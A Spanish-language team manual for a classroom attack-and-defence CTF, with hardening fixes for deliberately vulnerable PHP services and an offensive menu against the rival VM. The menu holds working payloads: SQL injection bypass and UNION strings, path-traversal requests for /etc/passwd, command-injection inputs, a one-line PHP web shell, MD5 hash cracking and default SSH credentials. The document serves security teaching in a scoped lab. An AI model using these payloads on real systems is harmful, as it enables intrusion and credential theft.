# Equipo IDS — Ibague Data Services | VM1

> Sos responsable de **operar y defender la VM1 (IDS)** Y de **atacar la VM2 del rival (Equipo UWS)**.
> Duracion del ejercicio: **3 horas**.

---

## 1. Tu identidad y la del rival (direcciones ip serán proporcionadas al inicio del ejercicio a cada equipo)

| Equipo                  | VM   | Servicio web                                  | SSH                                       |
|-------------------------|------|-----------------------------------------------|-------------------------------------------|
| **TU equipo (IDS)**     | VM1  | IDS — `http://<IP-VM1>:8080`                  | `ssh admin@<IP-VM1> -p 2222` (`password123`) |
| Rival (Equipo UWS)      | VM2  | UWS — `http://<IP-VM2>:8081`                  | `ssh admin@<IP-VM2> -p 2223` (`password123`) |
| Scoreboard (compartido) | VM3  | `http://<IP-SCOREBOARD>:9000`                 | —                                         |

> Pediles las IPs al instructor. La variable `SCOREBOARD_URL` ya quedo configurada en tu VM
> al momento del despliegue, asi que el dashboard de IDS muestra un banner con el link directo.

---

## 2. Objetivos del juego

Ganan puntos quienes cumplan **simultaneamente** estos tres objetivos:

1. **Tu servicio IDS (`http://<IP-VM1>:8080`) debe seguir respondiendo** durante toda la duracion del ejercicio. El instructor lo verifica con health checks periodicos (HTTP 200 sobre `/`).
2. **Conseguir banderas del rival** (todas con prefijo `FLAG{UCC_UWS_*}`) y/o **acumular mas puntos** que el rival al cierre.
3. **Si IDS queda caido o eliminado por mas de 10 minutos consecutivos**, **pierden por knock-out**: el rival gana automaticamente sin importar el marcador.

### Objetivos adicionales sugeridos (sumar/restar puntos)

| Concepto                                           | Efecto                |
|----------------------------------------------------|-----------------------|
| Cada bandera real del rival enviada al scoreboard  | Suma segun valor (50 a 150) |
| Bandera honeypot enviada (`FLAG{HONEYPOT_*}` / `FLAG{FAKE_*}`) | **-50 pts** |
| Reportar al instructor un honeypot **sin enviarlo** | **+25 pts** (gesto de inteligencia, no codicia) |
| Mantener el servicio sin downtime las 3 horas      | **+100 pts** al cierre |
| Cada ventana de 5 min consecutivos de downtime     | **-25 pts**           |
| Informe final tecnico (1 pagina, ver seccion 8)    | **+50 pts** si lo entregan |
| Explicar oralmente *por que* cada parche aplicado mitiga el vector | **+25 pts** |

---

## 3. Reglas (lo que NO podes hacer)

- No podes apagar Apache, MariaDB ni SSH de **tu propia VM**.
- No podes borrar archivos que rompan rutas activas (`index.php`, `admin.php`, etc.).
  **Modificar si**, borrar **no**.
- No podes hacer DoS / flood al rival. El objetivo es **ganarles banderas**, no tirarles el servicio a la fuerza.
- No podes atacar nada fuera del scope (IPs ajenas a las VMs del lab, internet, infra de la universidad).
- La bandera SSH (`/home/admin/flag.txt` dentro del contenedor `ctf1_db_ssh`) **debe permanecer en su ruta original** y **legible por el usuario `admin`**. Esta permitido endurecer el login (password fuerte, `fail2ban`, `MaxAuthTries`, deshabilitar `PasswordAuthentication` y exigir llave publica), pero **NO** podes mover, ocultar, encriptar ni borrar el archivo, ni eliminar al usuario `admin`. La defensa es *auth hardening*, no *hide the file*.
- No podes compartir banderas con el equipo rival (es un CTF, no una clase de etica fallida).

---

## 4. Despliegue de tu VM (sysadmin del equipo)

Asumiendo que el instructor te dio acceso a la VM1 con Docker instalado:

```bash
cd ~/ctf1                                          # carpeta del proyecto en la VM
export SCOREBOARD_URL="http://<IP-SCOREBOARD>:9000"
docker compose up -d --build
docker compose ps                                  # ambos containers UP
curl -sI http://localhost:8080 | head -n 1         # debe responder 200
```

Servicios que vas a operar:

| Container       | Puerto host | Para que                                      |
|-----------------|-------------|-----------------------------------------------|
| `ctf1_web_app`  | `8080`      | Apache + PHP. Aca vive `index.php`, `admin.php`, etc. |
| `ctf1_db_ssh`   | `2222`      | MariaDB + OpenSSH. SSH para pivot interno.    |

Tail de logs en tiempo real (util para deteccion):

```bash
docker logs -f ctf1_web_app   # accesos HTTP, errores PHP
docker logs -f ctf1_db_ssh    # auth ssh, queries MySQL
```

---

## 5. Tu superficie defensiva (parchear lo tuyo)

Tu IDS tiene **8 vulnerabilidades intencionales** que el rival va a explotar. Acá tenés
la lista priorizada y un fix corto por cada una. **Apliquen los parches en caliente sin tumbar el servicio.**

| # | Vector                | Endpoint propio          | Fix sugerido (en `ctf1/servidor_web/`)                                  |
|---|-----------------------|--------------------------|-------------------------------------------------------------------------|
| 1 | SQL Injection         | `/index.php`             | `mysqli_prepare(...)` + `bind_param("ss", $user, $pass)`                |
| 2 | Cookie tamper         | `/admin.php`             | Validar `$_SESSION['ctf_role']`, **eliminar** la lectura de `$_COOKIE['role']` |
| 3 | LFI / Path traversal  | `/download.php?file=`    | `realpath($base.'/'.$file)` y comparar contra `realpath(__DIR__.'/bucket')` |
| 4 | Config leak via LFI   | `/download.php?file=../config/app.ini` | Mismo fix que (3) cubre este caso                       |
| 5 | Command Injection     | `/network.php`           | `escapeshellarg($host)` + regex blanca `^[a-zA-Z0-9._-]+$`              |
| 6 | Upload RCE            | `/upload.php`            | Whitelist de extensiones + rename a `bin2hex(random_bytes(8)).ext` + `.htaccess` con `php_flag engine off` en `uploads/` |
| 7 | Hash leak             | tabla `secrets` (DB)     | `DELETE FROM secrets WHERE label LIKE 'legacy_md5_%';` y `REVOKE SELECT ON ctf_login.secrets FROM 'ctf_web'@'%';` |
| 8 | SSH pivot             | container `ctf1_db_ssh`  | `passwd admin` (password fuerte), en `/etc/ssh/sshd_config` poner `PermitRootLogin no`, `MaxAuthTries 3`, `LoginGraceTime 10`, opcional `PasswordAuthentication no` + llave publica precargada. `service ssh restart`. **No** mover la flag (regla del juego, ver seccion 3) |

### Snippets de fix listos para copiar

**SQLi (`index.php`):**
```php
$stmt = $mysqli->prepare("SELECT id, username, role FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $user, $pass);
$stmt->execute();
$result = $stmt->get_result();
```

**LFI (`download.php`):**
```php
$base = realpath(__DIR__ . '/bucket');
$req  = realpath($base . '/' . $file);
if ($req === false || strpos($req, $base . DIRECTORY_SEPARATOR) !== 0) {
    http_response_code(403); exit('Acceso denegado');
}
```

**Upload RCE (`uploads/.htaccess`):**
```apache
<FilesMatch "\.(php|phtml|phar|cgi)$">
    Require all denied
</FilesMatch>
php_flag engine off
```

**CSRF en `admin.php`** (vector adicional que el rival puede intentar):
```php
if (empty($_SESSION['csrf'])) { $_SESSION['csrf'] = bin2hex(random_bytes(16)); }
echo '<input type="hidden" name="csrf" value="'.$_SESSION['csrf'].'">';
```

> Despues de cada parche **probar manualmente que el sitio sigue funcionando** (login, dashboard, admin).
> El downtime se cuenta automatico. Si rompiste el deploy, `docker compose restart ctf1_web_app`.

---

## 6. Tu menu ofensivo (atacar al rival UWS)

El rival corre **el mismo set de vulnerabilidades** sobre `http://<IP-VM2>:8081`.
Las banderas del rival tienen prefijo `FLAG{UCC_UWS_*}`.

| # | Vector              | URL en el rival                                | Bandera (a enviar al scoreboard)              | Pts |
|---|---------------------|------------------------------------------------|------------------------------------------------|-----|
| 1 | SQL Injection       | `http://<IP-VM2>:8081/index.php`               | `FLAG{UCC_UWS_SQLi_Bypass}`                    | 50  |
| 2 | Cookie tamper       | `http://<IP-VM2>:8081/admin.php` con `role=admin` | `FLAG{UCC_UWS_Cookie_Bypass}`               | 75  |
| 3 | LFI                 | `/download.php?file=admin_notes.md`            | `FLAG{UCC_UWS_LFI_Found}`                      | 60  |
| 4 | Config leak via LFI | `/download.php?file=../config/app.ini`         | `FLAG{UCC_UWS_Config_Leaked}`                  | 70  |
| 5 | Command Injection   | `/network.php` (host `db_ssh; cat /etc/passwd`)| `FLAG{UCC_UWS_Cmd_Inject}`                     | 80  |
| 6 | Upload RCE          | `/upload.php` subiendo `shell.php`             | `FLAG{UCC_UWS_Upload_RCE}`                     | 120 |
| 7 | Hash cracking       | tabla `secrets` (via SQLi UNION)               | `FLAG{UCC_UWS_Hash_Cracked}`                   | 100 |
| 8 | SSH pivot           | `ssh admin@<IP-VM2> -p 2223`                   | `FLAG{UCC_UWS_Pwned}`                          | 150 |

### Quick wins (5 sub-grupos de 3 personas)

**SubGrupo A — SQLi + cookie:**
```
usuario: ' OR '1'='1' --
password: cualquiera
```
Login OK -> bandera SQLi. Despues abrir DevTools -> Application -> Cookies -> agregar
`role=admin` y visitar `/admin.php` -> bandera cookie.

**SubGrupo B — LFI:**
- `/download.php?file=admin_notes.md` (bandera LFI directa)
- `/download.php?file=../config/app.ini` (config leak)
- Bonus: `?file=../../../../../etc/passwd`

**SubGrupo C — Command Injection:**
- En `/network.php` poner host: `db_ssh; cat /var/www/html/config/app.ini`
- Para encontrar la flag: `localhost; find / -name "FLAG*" 2>/dev/null`

**SubGrupo D — Upload RCE:**
1. Crear `shell.php` localmente:
   ```php
   <?php system($_GET['c']); ?>
   ```
2. Subirlo via `/upload.php`.
3. Ejecutar: `http://<IP-VM2>:8081/uploads/shell.php?c=cat+/var/www/html/config/app.ini`.

**SubGrupo E — Hash + SSH:**
1. SQLi UNION: `' UNION SELECT 1,label,value FROM secrets -- `
2. Copiar los 3 hashes MD5 -> `hashcat -m 0 hashes.txt rockyou.txt`
3. Reportar `FLAG{UCC_UWS_Hash_Cracked}`.
4. Con `admin/password123` -> `ssh admin@<IP-VM2> -p 2223` -> `cat /home/admin/flag.txt`.

> **Roadmap rapido del rival:** `http://<IP-VM2>:8081/robots.txt` lista todos los endpoints "ocultos".

---

## 7. Honeypots y scoreboard

- En la DB del rival hay **al menos una bandera trampa** (`FLAG{HONEYPOT_*}` o `FLAG{FAKE_*}`).
  **NO la envien al scoreboard**: resta 50 pts. Si la encuentran y la reportan al instructor,
  ganan 25 pts de inteligencia.
- Cada bandera real cuenta **una sola vez** por equipo (la primera entrega es la valida).
- El scoreboard pide **alias** y **equipo** (`ids` / `uws`). Pongan siempre `ids`.

URL: `http://<IP-SCOREBOARD>:9000` (tambien linkeado desde el banner del dashboard de IDS).

---

## 8. Entregables al cierre (1 pagina por equipo)

Al terminar las 3 horas, entreguen un PDF de **1 pagina** con:

1. **Defensa:** lista de los parches aplicados, archivo modificado, justificacion (1 linea cada uno).
2. **Ofensiva:** banderas conseguidas con su payload o comando exacto.
3. **Lecciones aprendidas:** 3 bullets, libres.
4. **Downtime declarado:** si su servicio cayo, cuantos minutos y por que.

---

## 9. Estructura de la VM

```
ctf1/
├── README.md                 ← este archivo (manual unico del Equipo IDS)
├── docker-compose.yml        ← levanta web_app + db_ssh
├── servidor_web/             ← codigo PHP que tenes que defender
│   ├── index.php             ← SQLi
│   ├── admin.php             ← Cookie tamper + CSRF
│   ├── download.php          ← LFI
│   ├── network.php           ← Command Injection
│   ├── upload.php            ← Upload RCE
│   ├── bucket/               ← archivos visibles para LFI legitimo
│   ├── config/app.ini        ← config "secreta" (config leak)
│   ├── uploads/              ← donde aterriza el upload
│   └── ...
└── mysql_ssh/                ← MariaDB con `init.sql` (hashes MD5) + OpenSSH
```

Dudas tecnicas que excedan este README -> consultar al instructor o leer `docs/` en el repo principal.
